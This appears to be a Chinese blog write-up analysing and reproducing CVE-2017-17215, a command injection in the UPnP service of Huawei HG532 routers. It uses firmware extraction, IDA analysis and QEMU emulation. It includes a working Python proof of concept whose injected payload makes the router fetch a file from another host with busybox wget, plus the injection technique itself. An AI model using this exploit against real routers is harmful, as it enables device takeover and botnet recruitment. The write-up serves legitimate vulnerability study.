## 漏洞信息

CVE-2017-17215-HG532命令注入漏洞

华为 HG532 系列路由器是一款为家庭和小型办公用户打造的高速无线路由器产品。

漏洞利用的是upnp服务存在的注入漏洞实现任意命令执行。

## poc

```python
import requests

headers = {
    "Authorization": "Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669"
}

data = '''<?xml version="1.0" ?>
 <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
  <s:Body><u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1">
   <NewStatusURL>;/bin/busybox wget -g 172.16.16.17 -l /tmp/1 -r /1;</NewStatusURL>
   <NewDownloadURL>HUAWEIUPNP</NewDownloadURL>
  </u:Upgrade>
 </s:Body>
</s:Envelope>
'''
requests.post('http://172.16.16.21:37215/ctrlt/DeviceUpgrade_1',headers=headers,data=data)
```

## 分析

使用binwalk解压固件

```
$ binwalk -Me HG532eV100R001C01B020_upgrade_packet.bin
```

-Me选项用于递归扫描提取数据

根据公开的信息可知，漏洞处于upnp服务中，可直接将bin/upnp拖到IDA里面分析，也可以根据poc中的特征字符串`ctrlt`以及`DeviceUpgrade_1`寻找，看该字符串处于哪个可执行程序当中。

```
$ grep -r "ctrlt"
Binary file bin/upnp matches
$ grep -r "DeviceUpgrade"
Binary file bin/upnp matches
$ file bin/upnp
bin/upnp: ELF 32-bit MSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked, interpreter /lib/ld-, corrupted section header size
```

定位到upnp，查看得知文件类型是mips 32位的，且格式为大端MSB

扔进ida分析，根据poc，注入点是`<NewStatusURL>`以及`<NewDownloadURL>`，在字符串中找到它们：

![](https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/HG532命令注入-1.png)

查看引用的地方

![](https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/HG532命令注入-2.png)

跳转到调用函数可以看到，程序通过`ATP_XML_GetChildNodeByName`函数获取xml中的`<NewStatusURL>`节点，并且未经过检查就直接与`upg -g -U %s -t '1 Firmware Upgrade Image' -c upnp -r %s -d -`拼接使用`system`函数进行执行。

![](https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/HG532命令注入-3.png)

具体来说利用的原理就是首先在`<NewStatusURL>`输入单引号将前面的字符串闭合，然后再注入相应的执行命令即可，如需要执行`ls`命令，则需要做的就是构造`<NewStatusURL>';ls;</NewStatusURL>`节点即可。该节点字符串与`upg -g -U %s -t '1 Firmware Upgrade Image' -c upnp -r %s -d -`拼接得到`upg -g -U %s -t '1 Firmware Upgrade Image' -c upnp -r ';ls; -d -`，然后执行system调用，实现注入。

## 复现

### 按照以下方式可以实现通信，但是运行mic网络会崩

主要依据[这里](https://github.com/Mosk0ng/pwn4fun/blob/master/days/2020_11_7.md)来配置网络环境

补充：[debian mips qemu镜像链接](https://people.debian.org/~aurel32/qemu/mips/)
选择 debian_squeeze_mips_standard.qcow2和vmlinux-2.6.32-5-4kc-malta下载

虚拟机启动命令:

```
sudo qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append "root=/dev/sda1 console=tty0" -net nic -net tap -nographic
```

将固件包传到虚拟机

```
scp -r ./squashfs-root root@虚拟机ip:/root/
```

使用`chroot . sh`切换到该固件的根目录下，根据poc，找一下端口号37215

```
$ grep -r "37215"
Binary file bin/mic matches
```

端口号只出现在mic文件内，所以猜测是mic启动的upnp服务，直接运行`mic`命令。

### 再次尝试

根据https://www.freebuf.com/vuls/160040.html进行配置，但是有一步关闭ens33应为sudo ifdown eth33，再就是最后一步ifup eth1会出错，需要用ifconfig eth0 192.168.0.110 netmask 255.255.255.0再次配置，这里的192.168.0需要参考本机的br0网卡。

复现成功

![](https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/HG532命令注入-4.png)



参考：

- [CVE-2017-17215-HG532命令注入漏洞分析](https://xz.aliyun.com/t/4819)
- [通过CVE-2017-17215学习路由器漏洞分析，从入坑到放弃](https://www.freebuf.com/vuls/160040.html)

